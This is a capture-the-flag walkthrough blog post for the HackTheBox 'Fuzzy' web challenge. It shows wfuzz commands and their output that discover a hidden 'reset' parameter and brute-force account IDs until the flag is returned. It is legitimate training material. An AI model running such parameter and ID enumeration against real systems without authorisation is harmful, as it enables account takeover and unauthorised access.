---
Title: HackTheBox Fuzzy
Date: 2020-09-23
Category: Challenges
Status: published
---

Fuzzy is a fun and short challenge on a docker container. It is especially good for teaching beginners the basics of using a fuzzer to discover new endpoints on a webserver.Spawning the container and probing around a bit, we don't have too much success. Using dirbuster and a standard wordlist, we find the endpoint `/api/action.php`. With `wfuzz` we can now see whether passing any specific parameter to the endpoint significantly changes our response payload:

```sh
$ wfuzz -w seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 24 http://docker.hackthebox.eu:32514/api/action.php\?FUZZ

********************************************************
* Wfuzz 2.4.2 - The Web Fuzzer                         *
********************************************************

Target: http://docker.hackthebox.eu:32514/api/action.php?FUZZ
Total requests: 2588

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000106:   200        0 L      5 W      27 Ch       "reset"

Total time: 15.79833
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 163.8147
```

Passing the `reset` parameter yields the error message: `Error: Account ID not found`. We can use `wfuzz` again to fuzz
potential values for the parameter.

```sh
$ wfuzz -z range,0-1000 --hh 27 http://docker.hackthebox.eu:32514/api/action.php\?reset\=FUZZ
********************************************************
* Wfuzz 2.4.2 - The Web Fuzzer                         *
********************************************************

Target: http://docker.hackthebox.eu:32514/api/action.php?reset=FUZZ
Total requests: 1001

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000021:   200        0 L      10 W     74 Ch       "20"

Total time: 3.746470
Processed Requests: 1001
Filtered Requests: 1000
Requests/sec.: 267.1847
```

Finally, calling the assembled endpoint with the account ID 20, we get a response containing the flag:

```
http://docker.hackthebox.eu:32514/api/action.php?reset=20

```

Short and sweet. :)
